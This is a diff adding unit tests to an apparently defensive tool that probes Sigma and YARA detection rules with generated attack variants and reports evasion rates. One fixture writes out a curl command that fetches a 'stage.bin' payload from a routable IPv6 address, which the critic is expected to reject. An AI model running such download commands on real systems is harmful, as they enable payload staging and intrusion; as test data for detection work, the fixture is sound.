@@ -111,6 +111,41 @@ class SwarmCriticTests(unittest.TestCase):
         verdict = self.critic.evaluate(variant)
         self.assertTrue(verdict.passed, f"Safe variant rejected: {verdict.reason}")
 
+    def test_critic_rejects_routable_ipv6_literal(self):
+        variant = Variant(
+            id="test-5",
+            target_type="sigma",
+            axis="lolbin",
+            mutation_name="bad_ipv6",
+            description="Testing routable IPv6 literal rejection outside URL context",
+            payload={
+                "ParentImage": "C:\\Windows\\explorer.exe",
+                "Image": "C:\\Windows\\System32\\curl.exe",
+                "CommandLine": "curl.exe -g -6 [2001:4860:4860::8888]/stage.bin",
+            },
+            cycle=1,
+        )
+        verdict = self.critic.evaluate(variant)
+        self.assertFalse(verdict.passed)
+        self.assertIn("Routable IPv6", verdict.reason)
+
+    def test_critic_allows_loopback_and_link_local_ipv6(self):
+        variant = Variant(
+            id="test-6",
+            target_type="sigma",
+            axis="lolbin",
+            mutation_name="safe_ipv6",
+            description="Loopback and link-local IPv6 remain permitted",
+            payload={
+                "ParentImage": "C:\\Windows\\explorer.exe",
+                "Image": "C:\\Windows\\System32\\curl.exe",
+                "CommandLine": "curl.exe -g -6 [::1]:8080/health fe80::1",
+            },
+            cycle=1,
+        )
+        verdict = self.critic.evaluate(variant)
+        self.assertTrue(verdict.passed, f"Safe IPv6 variant rejected: {verdict.reason}")
+
 
 class SwarmCraftsmanTests(unittest.TestCase):
     """Verifies that Craftsmen generate variants across requested cycles."""
@@ -155,6 +190,10 @@ class SwarmDetectorTests(unittest.TestCase):
         result = detector.evaluate(variant)
         self.assertTrue(result.detected)
 
+    def test_yara_detector_resolves_single_rule_name(self):
+        detector = YaraDetector()
+        self.assertEqual(detector.target_rule_name, "Suspicious_Active_Content_SVG_Attachment")
+
     def test_sigma_detector_execution(self):
         detector = SigmaDetector()
         variant = Variant(
@@ -191,6 +230,11 @@ class SwarmOrchestratorEndToEndTests(unittest.TestCase):
         self.assertGreater(boundary_map.total_generated, 0)
         self.assertGreater(boundary_map.critic_approved, 0)
         self.assertGreater(len(results), 0)
+
+        # The boundary map must name the rule it probed instead of nulling it out.
+        self.assertEqual(boundary_map.target_rule, "Suspicious_Active_Content_SVG_Attachment")
+        for finding in boundary_map.findings:
+            self.assertEqual(finding.target_rule, "Suspicious_Active_Content_SVG_Attachment")
 
     def test_sigma_orchestrator_run(self):
         directive = OperatorDirective(
@@ -742,7 +786,7 @@ class StrategicSynthesizerTests(unittest.TestCase):
             content = output_path.read_text(encoding="utf-8")
             self.assertIn("Strategic Intelligence Cable", content)
             self.assertIn("Cluster A: LOLBin & Process Proxying", content)
-            self.assertIn("Empirical Analysis of 100 Autonomous Adversarial Swarm Probes", content)
+            self.assertIn("Empirical Analysis of 100 Adversarial Swarm Probes", content)
         finally:
             shutil.rmtree(temp_cables, ignore_errors=True)
             shutil.rmtree(temp_results, ignore_errors=True)
@@ -796,6 +840,168 @@ class StrategicSynthesizerTests(unittest.TestCase):
 
         self.assertEqual(stats["sources_excluded"], 0)
         self.assertEqual(stats["total_evaluations"], 12)
+
+    # -- record-ledger fixture helpers (record-backed synthesizer tests) --
+
+    @staticmethod
+    def _ledger_row(seq, kind, outcome, cluster=None, detail=None, counts=None):
+        return {
+            "run_id": "testfx-0001",
+            "seq": seq,
+            "timestamp": f"2026-09-10T00:00:{seq:02d}+00:00",
+            "suite": "endurance.test",
+            "kind": kind,
+            "probe_id": f"proc-{seq:04d}",
+            "target": "sigma",
+            "axis": None,
+            "cluster": cluster,
+            "rule_hash": None,
+            "fixture_hash": None,
+            "outcome": outcome,
+            "counts": counts,
+            "detail": detail or {},
+        }
+
+    @staticmethod
+    def _write_ledger(results_dir, rows):
+        rec_dir = Path(results_dir) / "records"
+        rec_dir.mkdir(parents=True, exist_ok=True)
+        (rec_dir / "run-testfx-0001.jsonl").write_text(
+            "\n".join(json.dumps(r) for r in rows) + "\n", encoding="utf-8"
+        )
+
+    def test_campaign_stage_intercepts_render_from_records(self):
+        """The diagram's stage intercepts derive from campaign-stage ledger records."""
+        from tools.swarm.synthesizer import StrategicSynthesizer
+
+        with tempfile.TemporaryDirectory() as cables, tempfile.TemporaryDirectory() as results:
+            results_dir = Path(results)
+            rows = [
+                self._ledger_row(1, "campaign_stage", "detected", detail={"stage_number": 1}),
+                self._ledger_row(2, "campaign_stage", "detected", detail={"stage_number": 1}),
+                self._ledger_row(3, "campaign_stage", "detected", detail={"stage_number": 1}),
+                self._ledger_row(4, "campaign_stage", "evaded", detail={"stage_number": 1}),
+                self._ledger_row(5, "campaign_stage", "detected", detail={"stage_number": 2}),
+                self._ledger_row(6, "campaign_stage", "detected", detail={"stage_number": 2}),
+                self._ledger_row(7, "campaign_stage", "evaded", detail={"stage_number": 2}),
+                self._ledger_row(8, "campaign_stage", "evaded", detail={"stage_number": 2}),
+                self._ledger_row(9, "attack_variant", "detected"),
+            ]
+            self._write_ledger(results_dir, rows)
+            synthesizer = StrategicSynthesizer(cables_dir=Path(cables), results_dir=results_dir)
+            output_path, _stats = synthesizer.synthesize()
+            content = output_path.read_text(encoding="utf-8")
+
+            stage1 = [l for l in content.splitlines() if "Stage 1: SVG Ingress" in l][0]
+            stage2 = [l for l in content.splitlines() if "Stage 2: ClickFix Exec" in l][0]
+            evade = [l for l in content.splitlines() if "evaded)" in l][0]
+            self.assertIn("75.0%", stage1)   # 3 of 4 stage-1 campaign visits intercepted
+            self.assertIn("50.0%", stage2)   # 2 of 4 stage-2 campaign visits intercepted
+            self.assertIn("25.0%", evade)    # 1 of 4 stage-1 visits evaded the layer
+
+    def test_stage_rates_absent_render_not_measured(self):
+        """Without campaign-stage records the diagram must render n/a, not a fallback."""
+        from tools.swarm.synthesizer import StrategicSynthesizer
+
+        with tempfile.TemporaryDirectory() as cables, tempfile.TemporaryDirectory() as results:
+            results_dir = Path(results)
+            self._write_ledger(
+                results_dir,
+                [self._ledger_row(i, "attack_variant", "detected") for i in range(1, 4)],
+            )
+            synthesizer = StrategicSynthesizer(cables_dir=Path(cables), results_dir=results_dir)
+            output_path, _stats = synthesizer.synthesize()
+            content = output_path.read_text(encoding="utf-8")
+
+            stage_lines = [
+                l
+                for l in content.splitlines()
+                if "Stage 1: SVG Ingress" in l or "Stage 2: ClickFix Exec" in l
+            ]
+            self.assertEqual(len(stage_lines), 2)
+            for line in stage_lines:
+                self.assertIn("n/a (not measured)", line)
+            self.assertNotIn("n/a Intercept", content)
+            self.assertNotIn("n/a evaded", content)
+
+    def test_cluster_percentages_divide_by_recorded_evasions(self):
+        """Cluster shares divide by recorded evasions, not the weighted gap counter."""
+        from tools.swarm.synthesizer import StrategicSynthesizer
+
+        with tempfile.TemporaryDirectory() as cables, tempfile.TemporaryDirectory() as results:
+            results_dir = Path(results)
+            cluster_a = "Cluster A: LOLBin & Process Proxying"
+            cluster_b = "Cluster B: Argument Masking & Parameter Aliasing"
+            cluster_c = "Cluster C: Parser Differentials & Offset Padding"
+            rows = [
+                self._ledger_row(1, "attack_variant", "detected"),
+                self._ledger_row(2, "attack_variant", "evaded", cluster=cluster_a),
+                self._ledger_row(3, "attack_variant", "evaded", cluster=cluster_a),
+                self._ledger_row(4, "attack_variant", "evaded", cluster=cluster_b),
+                self._ledger_row(5, "attack_variant", "evaded", cluster=cluster_c),
+                self._ledger_row(
+                    6,
+                    "noise_benchmark",
+                    None,
+                    counts={
+                        "generated_events": 10,
+                        "generated_attack_variants": 2,
+                        "benign_events": 8,
+                        "benign_false_positives": 0,
+                        "attack_events": 2,
+                        "attack_true_positives": 1,
+                        "attack_missed": 1,
+                    },
+                ),
+            ]
+            self._write_ledger(results_dir, rows)
+            synthesizer = StrategicSynthesizer(cables_dir=Path(cables), results_dir=results_dir)
+            output_path, _stats = synthesizer.synthesize()
+            content = output_path.read_text(encoding="utf-8")
+
+            # 4 of the 5 weighted gaps are record-classified; shares divide by 4.
+            self.assertIn("(2 of 4 recorded evasions — 50.0%)", content)
+            self.assertIn("(1 of 4 recorded evasions — 25.0%)", content)
+            self.assertIn("includes 1 benchmark and replay misses", content)
+            self.assertNotIn("of 5 recorded evasions", content)
+
+    def test_empty_evasion_basis_renders_not_measured(self):
+        """Zero recorded evasions must render n/a, never a 0.0% cluster share."""
+        from tools.swarm.synthesizer import StrategicSynthesizer
+
+        with tempfile.TemporaryDirectory() as cables, tempfile.TemporaryDirectory() as results:
+            results_dir = Path(results)
+            self._write_ledger(
+                results_dir,
+                [self._ledger_row(i, "attack_variant", "detected") for i in range(1, 4)],
+            )
+            synthesizer = StrategicSynthesizer(cables_dir=Path(cables), results_dir=results_dir)
+            output_path, _stats = synthesizer.synthesize()
+            content = output_path.read_text(encoding="utf-8")
+
+            self.assertIn("n/a — no recorded evasion observations in window", content)
+            self.assertNotIn("0 of 0 recorded evasions", content)
+            self.assertIn("the indirection share is not measured", content)
+
+    def test_empty_basis_refuses_synthesis(self):
+        """Zero observations must refuse synthesis instead of fabricating a figure."""
+        from tools.swarm.synthesizer import StrategicSynthesizer
+
+        with tempfile.TemporaryDirectory() as cables, tempfile.TemporaryDirectory() as results:
+            results_dir = Path(results)
+            (results_dir / "boundary_history_sigma.json").write_text(
+                json.dumps({"total_generated": 0, "evaded_count": 0}),
+                encoding="utf-8",
+                newline="\n",
+            )
+            (results_dir / "boundary_history_yara.json").write_text(
+                json.dumps({"total_generated": 0, "evaded_count": 0}),
+                encoding="utf-8",
+                newline="\n",
+            )
+            synthesizer = StrategicSynthesizer(cables_dir=Path(cables), results_dir=results_dir)
+            with self.assertRaises(ValueError):
+                synthesizer.synthesize()
 
 
 class TelemetryGeneratorTests(unittest.TestCase):
@@ -1645,6 +1851,36 @@ class WorkbenchCanvasTests(unittest.TestCase):
     def test_reports_all_three_live_metrics(self):
         for label in ("Depth of Defense", "Mean Time to Detect", "Path to Objective"):
             self.assertIn(label, self.html)
+
+    def test_no_premature_script_tag_closure(self):
+        """Ensures inline string literals do not contain unescaped </script>, which breaks HTML parsing."""
+        from html.parser import HTMLParser
+
+        class ScriptBoundaryTracker(HTMLParser):
+            def __init__(self):
+                super().__init__()
+                self.script_depth = 0
+                self.leaked_tokens = []
+
+            def handle_starttag(self, tag, attrs):
+                if tag == "script":
+                    self.script_depth += 1
+
+            def handle_endtag(self, tag):
+                if tag == "script":
+                    self.script_depth -= 1
+
+            def handle_data(self, data):
+                if self.script_depth == 0 and ("execution:" in data or "CAMP-CLICKFIX-001" in data):
+                    self.leaked_tokens.append(data.strip()[:60])
+
+        tracker = ScriptBoundaryTracker()
+        tracker.feed(self.html)
+        self.assertEqual(
+            tracker.leaked_tokens,
+            [],
+            f"JavaScript leaked outside <script> block due to unescaped tag: {tracker.leaked_tokens}",
+        )
 
 
 if __name__ == "__main__":
